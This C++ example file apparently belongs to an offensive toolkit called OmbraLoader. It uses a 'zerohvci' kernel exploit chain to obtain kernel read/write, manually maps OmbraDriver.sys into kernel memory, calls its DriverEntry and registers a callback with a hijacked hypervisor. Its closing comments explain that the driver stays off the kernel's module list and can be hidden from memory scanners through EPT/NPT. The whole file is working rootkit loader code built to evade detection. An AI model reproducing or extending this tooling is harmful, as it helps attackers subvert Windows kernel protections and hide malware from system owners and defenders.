/*
 * Driver Mapper Usage Example
 *
 * This demonstrates how to use the zerohvci::mapper API to map
 * OmbraDriver.sys into kernel memory after obtaining kernel R/W.
 */

#include "zerohvci.h"
#include "driver_mapper.h"
#include <cstdio>

void ExampleDriverMapping() {
    printf("[*] Phase 3.2: Driver Mapping Example\n");
    printf("========================================\n\n");

    // Step 1: Initialize exploit chain and KernelForge
    printf("[*] Step 1: Initialize exploit primitives\n");
    if (!zerohvci::Initialize()) {
        printf("[-] Failed to initialize zerohvci\n");
        return;
    }
    printf("[+] Kernel R/W obtained\n");
    printf("[+] KernelForge initialized\n\n");

    // Step 2: Map OmbraDriver.sys from disk
    printf("[*] Step 2: Map OmbraDriver.sys\n");
    const char* driverPath = "C:\\Windows\\System32\\drivers\\OmbraDriver.sys";

    uint64_t driverBase = zerohvci::mapper::MapDriver(driverPath);
    if (!driverBase) {
        printf("[-] Failed to map driver\n");
        zerohvci::Cleanup();
        return;
    }
    printf("[+] Driver mapped at 0x%llx\n\n", driverBase);

    // Step 3: Call DriverEntry
    printf("[*] Step 3: Call DriverEntry\n");

    // Calculate entry point address
    // Note: The mapper already processed relocations and imports,
    // so the entry point RVA needs to be obtained from the image

    // For this example, we'll assume DriverEntry is at base + entryRva
    // In a real implementation, you'd store this from the DriverImage class
    uint64_t entryPoint = driverBase + 0x1000; // Example RVA

    NTSTATUS status = zerohvci::mapper::CallDriverEntry(
        entryPoint,
        driverBase,
        0  // Fake registry path
    );

    if (NT_SUCCESS(status)) {
        printf("[+] DriverEntry succeeded: 0x%08x\n\n", status);
    }
    else {
        printf("[-] DriverEntry failed: 0x%08x\n\n", status);
    }

    // Step 4: Register callback with hypervisor (optional)
    printf("[*] Step 4: Register callback with hypervisor\n");

    // This assumes the hypervisor is active (after hijack)
    // and that your driver exports a callback function
    uint64_t callbackRva = 0x2000; // Example RVA

    if (zerohvci::mapper::RegisterDriverCallback(driverBase, callbackRva)) {
        printf("[+] Callback registered with hypervisor\n\n");
    }
    else {
        printf("[!] Hypervisor registration not available yet\n\n");
    }

    // Cleanup
    printf("[*] Cleanup\n");
    zerohvci::Cleanup();
    printf("[+] Done\n");
}

// Alternative: Map driver from embedded resource
void ExampleEmbeddedDriverMapping() {
    printf("[*] Embedded Driver Mapping Example\n");
    printf("=====================================\n\n");

    // Assume driver is embedded as a resource
    extern const uint8_t embedded_driver[];
    extern const size_t embedded_driver_size;

    if (!zerohvci::Initialize()) {
        printf("[-] Failed to initialize zerohvci\n");
        return;
    }

    uint64_t driverBase = zerohvci::mapper::MapDriverFromMemory(
        embedded_driver,
        embedded_driver_size
    );

    if (!driverBase) {
        printf("[-] Failed to map embedded driver\n");
        zerohvci::Cleanup();
        return;
    }

    printf("[+] Embedded driver mapped at 0x%llx\n", driverBase);
    zerohvci::Cleanup();
}

// Integration with OmbraLoader workflow
void OmbraLoaderPhase3_2() {
    printf("[*] OmbraLoader Phase 3.2: Driver Mapping\n");
    printf("==========================================\n\n");

    // Phase 3.1 should have verified hypercalls work
    // Now we map OmbraDriver.sys

    if (!zerohvci::Initialize()) {
        printf("[-] Exploit failed\n");
        return;
    }

    // Map driver
    uint64_t driverBase = zerohvci::mapper::MapDriver("OmbraDriver.sys");
    if (!driverBase) {
        printf("[-] Driver mapping failed\n");
        zerohvci::Cleanup();
        return;
    }

    // At this point, the driver is in kernel memory with:
    // - All sections mapped
    // - Relocations processed
    // - Imports resolved from ntoskrnl.exe
    // - Ready to call DriverEntry

    printf("[+] Driver ready at 0x%llx\n", driverBase);

    // Next phase: Call DriverEntry to initialize the driver
    // The driver will then use VMCALL to communicate with the hypervisor

    zerohvci::Cleanup();
}

/*
 * IMPORTANT NOTES:
 *
 * 1. The mapper ONLY supports imports from ntoskrnl.exe
 *    Any other imports will fail. This is typical for kernel drivers.
 *
 * 2. DriverEntry signature:
 *    NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 *
 *    Since we're manually mapping, we pass fake/null pointers.
 *    The driver must be written to handle this.
 *
 * 3. Memory is allocated as NonPagedPoolNx (non-executable by default).
 *    If the driver needs executable code pages, you'll need to:
 *    - Allocate with NonPagedPoolExecute (if available), OR
 *    - Use EPT/NPT to make pages executable from the hypervisor
 *
 * 4. The driver is NOT registered with the kernel's driver list.
 *    It's completely hidden - no PsLoadedModuleList entry.
 *
 * 5. After mapping, use EPT/NPT from the hypervisor to hide the driver
 *    from kernel memory scanners.
 */
